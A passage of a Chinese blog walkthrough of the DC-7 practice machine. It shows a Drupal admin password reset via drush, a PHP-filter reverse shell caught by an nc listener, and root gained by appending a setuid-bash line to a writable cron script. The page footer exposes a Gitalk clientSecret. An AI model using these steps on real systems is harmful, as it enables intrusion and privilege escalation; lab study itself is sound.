&lt;E1i3EPu-0000CV-5C@dc-7&gt;<br>Date: Thu, 29 Aug 2019 17:00:22 +1000<br><br>Database dump saved to /home/dc7user/backups/website.sql               [success]<br>gpg: symmetric encryption of <span class="hljs-string">&#x27;/home/dc7user/backups/website.tar.gz&#x27;</span> failed: File exists<br>gpg: symmetric encryption of <span class="hljs-string">&#x27;/home/dc7user/backups/website.sql&#x27;</span> failed: File exists<br></code></pre></td></tr></table></figure>
+
+<h2 id="定时任务文件"><a href="#定时任务文件" class="headerlink" title="定时任务文件"></a>定时任务文件</h2><p>看起来似乎是邮件提示，里面提到了 <code>/opt/scripts/backups.sh</code> 文件，看一看这个文件的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:~$ <span class="hljs-built_in">cat</span> /opt/scripts/backups.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">rm</span> /home/dc7user/backups/*<br><span class="hljs-built_in">cd</span> /var/www/html/<br>drush sql-dump --result-file=/home/dc7user/backups/website.sql<br><span class="hljs-built_in">cd</span> ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql<br>gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz<br><span class="hljs-built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.sql<br><span class="hljs-built_in">rm</span> /home/dc7user/backups/website.tar.gz<br><br>dc7user@dc-7:/opt/scripts$ <span class="hljs-built_in">ls</span> -alih<br>total 12K<br>269846 drwxr-xr-x 2 root www-data 4.0K Aug 29  2019 .<br>262385 drwxr-xr-x 3 root root     4.0K Aug 29  2019 ..<br>272756 -rwxrwxr-x 1 root www-data  520 Aug 29  2019 backups.sh<br><br></code></pre></td></tr></table></figure>
+
+<p>感觉像个定时任务，定期把备份文件，并且把文件用 gpg 工具加密后存放在用户家目录的 backups 目录下。除此之外还有个比较有意思的事情，这个文件的属主是 root，但是却被划归到 www-data组里 ，并且 www-data 的组成员还有对这个文件的修改权限。那接下来考虑考虑如何登录到后台反弹 shell。还有个问题是上述代码里提到了关于 gpg 工具的使用，问问 chatgpt</p>
+<p><img src="/pic/e158c95a2fb31449844473748a720d0f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="gpg-解密"><a href="#gpg-解密" class="headerlink" title="gpg 解密"></a>gpg 解密</h2><p>那我们可以尝试进行解密，然后拿到 sql 文件，找找其中有没有登录用户的密码</p>
+<p><img src="/pic/02ecfc3e2ee9be21cadc36f7a10fc797_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用上述命令解压获得 sql 文件，里面全是 sql 语句，那我们就找找已知的一个用户 <code>dc7user</code>，我这里用 vscode 打开，然后搜索，找到了插入密码的语句，尝试破解，但是这是 drupal 自己的加密算法……john 的 format 中没有这个算法，使用在线工具也没得到答案</p>
+<p><img src="/pic/57bf196cbbaa1c98f1536c7530c9c4b7_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>既然 gpg 命令用上了，那么 drush 命令有什么作用呢</p>
+<p><img src="/pic/98357999e91c53beec6fb6f396893f52_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="drush-用户管理"><a href="#drush-用户管理" class="headerlink" title="drush 用户管理"></a>drush 用户管理</h2><p>可以进行用户管理，那我们可以修改 admin 用户的密码（sql 语句中可以判断出还有个 admin 用户），刚开始直接使用命令产生了报错</p>
+<p><img src="/pic/f770fa4a66d53da68c1046c7543d8b63_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们尝试切换到网站目录下，再运行一次命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:/var/www/html$ drush user:password admin --password=<span class="hljs-string">&quot;123456&quot;</span><br>Changed password <span class="hljs-keyword">for</span> admin                                                                               [success]<br></code></pre></td></tr></table></figure>
+
+<h2 id="drupal后台getshell"><a href="#drupal后台getshell" class="headerlink" title="drupal后台getshell"></a>drupal后台getshell</h2><p>成功更换了密码，登录后台。但是我找了半天都没有找到如何上传或者修改文件来 getshell，我尝试了搜索 <code>drupal upload php</code> <code>drupal upload php file</code> 和 <code>drupal upload php shell</code> ，有个视频点进去<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=GkPnorkwyEU">How To Upload Shell in Drupal (Easy Way) - YouTube</a></p>
+<p><img src="/pic/425ff94df51eb5ebda0b1c59ad7d47cb_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要开启 php filter 模块</p>
+<p><img src="/pic/712d5b5a7d6a33934c22e404a061f01b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>但我在界面里没找到，看来需要自己手动安装</p>
+<p><img src="/pic/900b8ead9981b603e1e7c3ca02604e8a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试找找如何下载这个模块，点进第一个链接 <a target="_blank" rel="noopener" href="https://www.drupal.org/project/php">PHP | Drupal.org</a></p>
+<p><img src="/pic/07949941f93565f58f3edce13b578dbf_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>在页面最下面找到了下载链接，将其下载到本地然后上传上去</p>
+<p><img src="/pic/b9ad439ebb1f864127848aa4767d74b1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>安装成功，可能按照视频里那样，将其开启了。选中该模块，下滑拉到页面最下方，选择 install</p>
+<p><img src="/pic/b0386ee4c8561410ffe905f70bd210cd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到界面提示 <code>Module PHP Filter has been enabled. </code></p>
+<p><img src="/pic/65f0dcd8ea718f0316c0d255a107fdf1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>新建内容</p>
+<p><img src="/pic/8a5f3c55f558587336de9b382851a68a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>选择类型为 phpcode</p>
+<p><img src="/pic/7981a750cc45d7e1a4eda2c4e600bbfe_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>刚开始传了个最简单 php，一下子就断开了连接。换了个经典 reverseshell</p>
+<p><img src="/pic/6bd47a7b0e41ef5b2827bfde1087049b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>开启监听后，再点 save，成功反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_7]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.127] 43874<br>Linux dc-7 4.9.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span><br> 23:26:39 up 23 min,  1 user,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>dc7user  pts/0    192.168.56.106   23:16    8:23   0.02s  0.02s -bash<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>完善一下 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@dc-7:/$ <span class="hljs-built_in">cd</span> /opt/scripts<br><span class="hljs-built_in">cd</span> /opt/scripts<br>www-data@dc-7:/opt/scripts$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backups.sh<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>把 sh 文件修改一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-7:/opt/scripts$ <span class="hljs-built_in">cat</span> backups.sh<br><span class="hljs-built_in">cat</span> backups.sh<br><span class="hljs-comment">#!/bin/bash</span><br>www-data@dc-7:/opt/scripts$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash;chmod +xs /tmp/bash&quot;</span> &gt;&gt; backups.sh<br>&lt;n/bash /tmp/bash;<span class="hljs-built_in">chmod</span> +xs /tmp/bash<span class="hljs-string">&quot; &gt;&gt; backups.sh</span><br></code></pre></td></tr></table></figure>
+
+<p>等了约十分钟左右，在 tmp 中看到了 bash 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:/tmp$ <span class="hljs-built_in">ls</span> -laih<br>total 6.4M<br>   297 drwxrwxrwt  9 root    root    4.0K Jul 11 22:15 .<br>     2 drwxr-xr-x 22 root    root    4.0K Aug 29  2019 ..<br> 19744 -rwxr-xr-x  1 dc7user dc7user  520 Jul 11 18:55 backups.sh.bak<br> 19749 -rwsr-sr-x  1 root    root    1.1M Jul 11 22:15 bash<br>142361 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .font-unix<br>140696 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .ICE-unix<br>142662 drwx------  3 root    root    4.0K Jul 11 18:47 systemd-private-08c188e365d948dfb5100a1d5a8a6631-apache2.service-EHVFfc                                                                                                          <br>142543 drwx------  3 root    root    4.0K Jul 11 18:47 systemd-private-08c188e365d948dfb5100a1d5a8a6631-systemd-timesyncd.service-VQL1CO                                                                                                <br>142541 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .Test-unix<br> 19747 -rw-r--r--  1 dc7user dc7user 5.3M Jul 11 21:18 website.sql<br>131153 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .X11-unix<br>141106 drwxrwxrwt  2 root    root    4.0K Jul 11 18:47 .XIM-unix<br>dc7user@dc-7:/tmp$ ./bash -p<br>bash-4.4<span class="hljs-comment"># whoami</span><br>root<br>bash-4.4<span class="hljs-comment"># cd /root</span><br>bash-4.4<span class="hljs-comment"># ls</span><br>theflag.txt<br>bash-4.4<span class="hljs-comment"># cat theflag.txt</span><br><br><br><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  <span class="hljs-string">&quot;Y88b                            888 888 888 888 </span><br><span class="hljs-string">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="hljs-string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="hljs-string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="hljs-string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="hljs-string">&quot;   &quot;</span>   <span class="hljs-string">&quot;   &quot;</span>  <br>888P     Y888  <span class="hljs-string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="hljs-string">&quot;Y88P&quot;</span>  888  888  <span class="hljs-string">&quot;Y8888  888 888 888 888 </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span><br><span class="hljs-string">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="hljs-string">challenges.</span><br><span class="hljs-string"></span><br><span class="hljs-string">I&#x27;m sending out an especially big thanks to:</span><br><span class="hljs-string"></span><br><span class="hljs-string">@4nqr34z</span><br><span class="hljs-string">@D4mianWayne</span><br><span class="hljs-string">@0xmzfr</span><br><span class="hljs-string">@theart42</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DC-7 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/c67b9582251d.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/18f5865fb0df.html" title="eLection_1 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">eLection_1 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/d3fd0d829200.html" title="DC-3 靶机">
+                        <span class="hidden-mobile">DC-3 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '1be36d62641a0f85d48a2aff6ed0bb66'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
